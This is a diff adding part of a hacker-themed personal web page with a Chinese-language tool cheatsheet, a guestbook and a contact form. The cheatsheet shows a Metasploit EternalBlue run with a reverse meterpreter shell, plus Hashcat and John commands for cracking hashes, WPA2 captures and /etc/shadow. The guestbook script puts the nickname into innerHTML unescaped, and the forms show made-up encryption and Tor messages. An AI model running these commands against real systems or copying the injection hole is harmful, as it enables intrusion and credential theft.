+                                    <div class="output-comment mb-1"># 加载漏洞利用模块</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > use exploit/windows/smb/ms17_010_eternalblue</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 查看需要配置的参数</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > show options</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 设置攻击目标IP</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > set RHOSTS 192.168.1.100</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 设置反弹Shell载荷和本机IP</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > set payload windows/x64/meterpreter/reverse_tcp<br>msf6 > set LHOST 192.168.1.128</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 检测目标是否存在漏洞</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > check</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 执行攻击</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > exploit</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Hashcat 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">🔑</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">Hashcat · GPU加速密码破解</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">世界最快密码破解工具 · 支持300+哈希算法</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 常用参数说明：</div>
+                                    <div class="text-[#999] text-xs font-mono">-m 指定哈希类型 (0=MD5, 100=SHA1, 1000=NTLM, 2500=WPA/WPA2, 3200=bcrypt)<br>-a 指定破解模式 (0=字典, 3=掩码暴力)<br>-o 结果输出文件<br>--force 忽略警告</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 字典破解MD5哈希</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">hashcat -m 0 -a 0 hash.txt rockyou.txt --force</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 掩码暴力破解8位数字密码</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d --force</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 破解WiFi握手包(WPA2)</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">hashcat -m 2500 -a 0 capture.hccapx rockyou.txt --force</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 显示已经破解的结果</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">hashcat -m 0 hash.txt --show</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Burp Suite 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">💉</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">Burp Suite · Web渗透测试框架</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">Web安全瑞士军刀 · 抓包改包/扫描/爆破/重放一体化</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 浏览器代理设置</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">127.0.0.1:8080，导入Burp CA证书才能抓HTTPS包</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 核心模块说明：</div>
+                                    <div class="text-[#999] text-xs font-mono">Proxy → 拦截/修改HTTP/HTTPS请求响应<br>Repeater → 重放修改后的请求，手工测试漏洞<br>Intruder → 自动化爆破（密码、参数fuzz）<br>Scanner → 自动漏洞扫描（Pro版）<br>Decoder → 编码解码（URL/Base64/HEX等）<br>Comparer → 两次响应差异对比</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 典型工作流：</div>
+                                    <div class="text-[#cccccc] text-sm font-mono">浏览器开代理 → Proxy拦截数据包 → 发送到Repeater修改测试 → 发现漏洞点发送到Intruder批量爆破 → 提交漏洞</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Wireshark 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">⚡</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">Wireshark · 网络流量分析</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">抓包分析工具 · 深度解析上千种网络协议</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 常用过滤表达式：</div>
+                                    <div class="text-[#999] text-xs font-mono">http → 只显示HTTP流量<br>tcp.port == 80 → 过滤80端口TCP流量<br>ip.addr == 192.168.1.100 → 过滤指定IP流量<br>tcp.flags.syn == 1 → 只看SYN包（扫描探测）<br>http.request.method == "POST" → 只看POST请求<br>arp → ARP协议，内网主机发现</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 典型用途：</div>
+                                    <div class="text-[#cccccc] text-sm">排查网络故障、分析攻击流量、提取明文密码、还原HTTP文件、内网流量审计。</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- John the Ripper 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">🔓</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">John the Ripper · 密码破解</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">经典开源离线密码破解工具</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 破解Linux /etc/shadow密码</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">unshadow /etc/passwd /etc/shadow > hashes.txt<br>john --wordlist=rockyou.txt hashes.txt</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 破解Zip压缩包密码</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">zip2john protected.zip > zip_hash.txt<br>john --wordlist=rockyou.txt zip_hash.txt</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 查看破解结果</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">john --show hashes.txt</div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <div class="mt-8 pt-4 border-t border-[#1a3a1a] text-center">
+                        <div class="output-warning">[!] Remember: With great power comes great responsibility.</div>
+                        <div class="output-comment mt-2">// 本教程所有命令仅用于授权安全测试与学习研究</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 留言板 -->
+        <section id="guestbook" class="mb-12 fade-in delay-3">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-btn terminal-btn-close"></div>
+                    <div class="terminal-btn terminal-btn-min"></div>
+                    <div class="terminal-btn terminal-btn-max"></div>
+                    <div class="terminal-title">root@kali: ~/guestbook.log -- <span id="gb-count">0</span> messages</div>
+                </div>
+                <div class="terminal-body text-[14px] md:text-[15px]">
+                    <div class="prompt">cat guestbook.log</div>
+                    <div class="mt-4 output-success">[+] Guestbook system running. Messages are end-to-end encrypted.</div>
+                    <div class="output-info">[i] Leave your message in the terminal below.</div>
+
+                    <!-- 留言列表 -->
+                    <div class="mt-6 border border-[#1a3a1a] bg-black/70 p-4 max-h-[400px] overflow-y-auto font-mono text-xs space-y-4" id="messages-list">
+                        <!-- 暂无留言，新留言将动态添加到这里 -->
+                    </div>
+
+                    <!-- 发送留言表单 -->
+                    <div class="mt-6">
+                        <div class="output-comment mb-3">// LEAVE A MESSAGE</div>
+                        <form onsubmit="handleGuestbookSubmit(event)" class="space-y-3">
+                            <div>
+                                <label class="text-xs text-[#666] block mb-1">$ nickname:</label>
+                                <input type="text" id="gb-nickname" class="terminal-input text-sm w-full" placeholder="Enter your nickname (default: anonymous)" value="anonymous">
+                            </div>
+                            <div>
+                                <label class="text-xs text-[#666] block mb-1">$ message:</label>
+                                <textarea id="gb-message" class="terminal-input text-sm w-full" rows="3" placeholder="Type your message here..." required></textarea>
+                            </div>
+                            <button type="submit" class="terminal-btn-submit w-full">
+                                [ TRANSMIT MESSAGE ]
+                            </button>
+                        </form>
+                        <div id="gb-result" class="mt-3 text-sm"></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 联系我 -->
+        <section id="contact" class="mb-12">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-btn terminal-btn-close"></div>
+                    <div class="terminal-btn terminal-btn-min"></div>
+                    <div class="terminal-btn terminal-btn-max"></div>
+                    <div class="terminal-title">root@kali: ~/contact.sh --establish-connection</div>
+                </div>
+                <div class="terminal-body text-[14px] md:text-[15px]">
+                    <div class="prompt">./contact.sh init</div>
+                    <div class="mt-4 output-success">[+] Secure communication channel initialized.</div>
+                    <div class="output-info">[i] You can reach me via the following channels:</div>
+
+                    <div class="grid md:grid-cols-2 gap-8 mt-6">
+                        <div>
+                            <div class="output-comment mb-4">// CONTACT CHANNELS</div>
+                            <div class="space-y-3">
+                                <div class="flex items-center gap-3">
+                                    <span class="text-[#ff3333] w-20">EMAIL:</span>
+                                    <span>your-email@example.com</span>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <span class="text-[#ff3333] w-20">GITHUB:</span>
+                                    <a href="#" class="hacker-link">github.com/yourusername</a>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <span class="text-[#ff3333] w-20">TWITTER:</span>
+                                    <a href="#" class="hacker-link">@yourhandle</a>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <span class="text-[#ff3333] w-20">WECHAT:</span>
+                                    <span>your_wechat_id</span>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <span class="text-[#ff3333] w-20">PGP KEY:</span>
+                                    <a href="#" class="hacker-link">[Download Public Key]</a>
+                                </div>
+                            </div>
+                            <div class="mt-6 p-3 border border-[#1a3a1a] bg-black/50">
+                                <div class="output-warning text-sm">[!] LEGAL DISCLAIMER</div>
+                                <div class="text-[10px] text-[#666] mt-2">
+                                    All content on this site is for educational purposes only. 
+                                    Do not use any techniques described here against systems 
+                                    you do not own or have explicit permission to test. 
+                                    Unauthorized access is illegal.
+                                </div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <div class="output-comment mb-4">// SEND MESSAGE</div>
+                            <form onsubmit="handleSubmit(event)" class="space-y-3">
+                                <div>
+                                    <label class="text-xs text-[#666] block mb-1">$ name:</label>
+                                    <input type="text" class="terminal-input text-sm" placeholder="Enter your name" required>
+                                </div>
+                                <div>
+                                    <label class="text-xs text-[#666] block mb-1">$ email:</label>
+                                    <input type="email" class="terminal-input text-sm" placeholder="your@email.com" required>
+                                </div>
+                                <div>
+                                    <label class="text-xs text-[#666] block mb-1">$ message:</label>
+                                    <textarea class="terminal-input text-sm" rows="4" placeholder="Type your message..." required></textarea>
+                                </div>
+                                <button type="submit" class="terminal-btn-submit w-full">
+                                    [ EXECUTE SEND ]
+                                </button>
+                            </form>
+                            <div id="form-result" class="mt-3 text-sm"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 页脚 -->
+        <footer class="text-center text-[#444] text-xs py-6 border-t border-[#1a3a1a]">
+            <div>(c) 2026 Security Researcher. All rights reserved.</div>
+            <div class="mt-1">Hacked with ❤️ using vim on Kali Linux | <span class="blink">_</span></div>
+            <div class="mt-2 output-comment">/* Stay curious, stay paranoid. Knowledge is freedom. */</div>
+        </footer>
+
+    </main>
+
+    <script>
+        // 矩阵雨效果
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?/~`abcdefghijklmnopqrstuvwxyz';
+        const fontSize = 14;
+        let columns = Math.floor(canvas.width / fontSize);
+        let drops = Array(columns).fill(1);
+
+        window.addEventListener('resize', () => {
+            columns = Math.floor(canvas.width / fontSize);
+            drops = Array(columns).fill(1);
+        });
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 50);
+
+        // 打字机效果
+        const typingText = document.getElementById('typing-text');
+        const commands = [
+            'echo "Welcome, friend. The Matrix has you..."',
+            'whoami',
+            'cat /etc/motd',
+            'neofetch --stdout'
+        ];
+        let commandIndex = 0;
+        let charIndex = 0;
+        let isDeleting = false;
+
+        function typeWriter() {
+            const currentCommand = commands[commandIndex];
+            
+            if (isDeleting) {
+                typingText.textContent = currentCommand.substring(0, charIndex - 1);
+                charIndex--;
+            } else {
+                typingText.textContent = currentCommand.substring(0, charIndex + 1);
+                charIndex++;
+            }
+
+            let typeSpeed = isDeleting ? 30 : 60;
+
+            if (!isDeleting && charIndex === currentCommand.length) {
+                typeSpeed = 2000;
+                isDeleting = true;
+            } else if (isDeleting && charIndex === 0) {
+                isDeleting = false;
+                commandIndex = (commandIndex + 1) % commands.length;
+                typeSpeed = 500;
+            }
+
+            setTimeout(typeWriter, typeSpeed);
+        }
+        typeWriter();
+
+        // 命令执行模拟
+        function executeCommand(cmd) {
+            const output = document.getElementById('command-output');
+            let result = '';
+            
+            const responses = {
+                whoami: `<div class="output-success">[+] ID: HZYcpp</div>
+                        <div class="output-info">[i] Location: Suzhou, China</div>
+                        <div class="output-info">[i] Motto: 起来！不愿做奴隶的人们！</div>`,
+                tutorials: `<div class="output-comment">[*] Loading hacking toolkit tutorials...</div>
+                        <div class="output-success">[+] 7 tool tutorials loaded: Nmap, SQLMap, MSF, Hashcat, Burp, Wireshark, John</div>
+                        <div class="output-info">[i] Scroll down to TUTORIALS section for full commands cheatsheet.</div>`,
+                guestbook: `<div class="output-comment">[*] Accessing guestbook system...</div>
+                        <div class="output-success">[+] Guestbook loaded.</div>
+                        <div class="output-info">[i] Scroll down to leave your message.</div>`,
+                tools: `<div class="output-comment">[*] Listing security arsenal...</div>
+                        <div class="output-success">[+] 18 offensive tools loaded.</div>
+                        <div class="output-success">[+] 14 additional tools available.</div>
+                        <div class="output-info">[i] See tools section below for details.</div>`,
+                contact: `<div class="output-success">[+] Communication channels opened.</div>
+                        <div class="output-info">[i] See contact section below for details.</div>
+                        <div class="output-warning">[!] Encrypted channels preferred.</div>`
+            };
+
+            result = responses[cmd] || `<div class="output-error">[-] Command not found: ${cmd}</div><div class="output-comment">Available: whoami, tutorials, guestbook, tools, contact</div>`;
+            
+            output.innerHTML = `<div class="prompt-user">${cmd}</div>${result}`;
+        }
+
+        // 表单提交处理
+        function handleSubmit(e) {
+            e.preventDefault();
+            const result = document.getElementById('form-result');
+            result.innerHTML = `<div class="output-success">[+] Message encrypted and sent!</div>
+                              <div class="output-info">[i] I will respond via secure channel shortly.</div>`;
+            e.target.reset();
+            setTimeout(() => result.innerHTML = '', 5000);
+        }
+
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+
+        // 导航激活状态
+        window.addEventListener('scroll', () => {
+            const sections = document.querySelectorAll('section');
+            const navLinks = document.querySelectorAll('.nav-link');
+            let current = '';
+            
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (scrollY >= sectionTop - 100) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === '#' + current) {
+                    link.classList.add('active');
+                }
+            });
+        });
+
+        // 控制台彩蛋
+        console.log('%c🚨 YOU ARE BEING WATCHED 🚨', 'color: #ff3333; font-size: 24px; font-weight: bold;');
+        console.log('%cJust kidding. Welcome to the matrix.', 'color: #00ff41; font-size: 14px;');
+        // 留言板提交处理
+        function handleGuestbookSubmit(e) {
+            e.preventDefault();
+            const nickname = document.getElementById('gb-nickname').value.trim() || 'anonymous';
+            const message = document.getElementById('gb-message').value.trim();
+            const result = document.getElementById('gb-result');
+            
+            if (!message) {
+                result.innerHTML = '<span class="output-error">[!] Message cannot be empty</span>';
+                return;
+            }
+
+            // 模拟加密传输效果
+            result.innerHTML = '<span class="output-info">[i] Encrypting message with AES-256...</span>';
+            
+            setTimeout(() => {
+                result.innerHTML = '<span class="output-info">[i] Transmitting over Tor network...</span>';
+            }, 600);
+
+            setTimeout(() => {
+                result.innerHTML = '<span class="output-success">[+] Message delivered successfully! It will appear in the log below.</span>';
+                
+                // 添加新留言到列表
+                const now = new Date();
+                const timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
+                const messageCount = document.querySelectorAll('#messages-list > div').length + 1;
+                
+                const newMessage = document.createElement('div');
+                newMessage.className = 'border-b border-[#1a3a1a] pb-3';
+                newMessage.innerHTML = `
+                    <div class="flex items-center gap-2 mb-1">
+                        <span class="text-[#ff3333]">[${timestamp}]</span>
+                        <span class="text-[#00bfff]">${nickname}@visitor</span>
+                        <span class="text-[#556b2f]">#${messageCount}</span>
+                    </div>
+                    <div class="text-[#cccccc] pl-5">
+                        &gt; ${message.replace(/</g, '&lt;').replace(/>/g, '&gt;')}
+                    </div>
+                `;
+                
+                document.getElementById('messages-list').prepend(newMessage);
+                
+                // 更新留言计数
+                document.getElementById('gb-count').textContent = messageCount;
+                
+                // 清空表单
+                document.getElementById('gb-message').value = '';
+                
+                // 滚动到顶部
+                document.getElementById('messages-list').scrollTop = 0;
+            }, 1500);
+        }
+
+        console.log('%cInterested in security? Let\'s connect.', 'color: #00bfff; font-size: 12px;');
+    </script>
+</body>
+</html>
